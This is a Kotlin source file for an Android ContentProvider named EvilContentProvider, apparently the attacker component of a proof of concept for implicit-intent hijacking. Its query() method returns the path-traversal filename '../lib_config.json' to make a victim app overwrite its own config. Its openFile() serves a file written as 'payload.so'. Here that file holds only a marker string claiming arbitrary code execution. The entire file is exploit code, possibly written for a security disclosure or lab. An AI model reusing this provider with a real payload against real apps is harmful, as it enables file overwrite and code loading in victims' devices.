package com.attacker.codeexec

import android.content.ContentProvider
import android.content.ContentValues
import android.database.Cursor
import android.database.MatrixCursor
import android.net.Uri
import android.os.ParcelFileDescriptor
import android.util.Log
import java.io.File
import java.io.FileNotFoundException



class EvilContentProvider : ContentProvider() {

    override fun onCreate(): Boolean {
        context?.let { ctx ->
            val payload = File(ctx.filesDir, "payload.so")
            payload.writeText("MALICIOUS CODE EXECUTED - This proves arbitrary code execution via implicit intent hijacking")
            Log.w("ATTACKER", "Malicious payload written to: ${payload.absolutePath}")
        }
        return true
    }

    override fun query(
        uri: Uri,
        projection: Array<out String>?,
        selection: String?,
        selectionArgs: Array<out String>?,
        sortOrder: String?
    ): Cursor {
        val matrixCursor = MatrixCursor(arrayOf("_display_name"))
        // Path traversal: overwrites the victim's lib_config.json
        matrixCursor.addRow(arrayOf("../lib_config.json"))
        Log.w("ATTACKER", "query() returning path-traversal filename: ../lib_config.json")
        return matrixCursor
    }

    @Throws(FileNotFoundException::class)
    override fun openFile(uri: Uri, mode: String): ParcelFileDescriptor {
        val payload = File(context!!.filesDir, "payload.so")
        Log.w("ATTACKER", "openFile() serving malicious payload: ${payload.absolutePath}")
        return ParcelFileDescriptor.open(payload, ParcelFileDescriptor.MODE_READ_ONLY)
    }

    override fun getType(uri: Uri): String = "application/octet-stream"
    override fun insert(uri: Uri, values: ContentValues?): Uri? = null
    override fun delete(uri: Uri, selection: String?, selectionArgs: Array<out String>?): Int = 0
    override fun update(uri: Uri, values: ContentValues?, selection: String?, selectionArgs: Array<out String>?): Int = 0
}
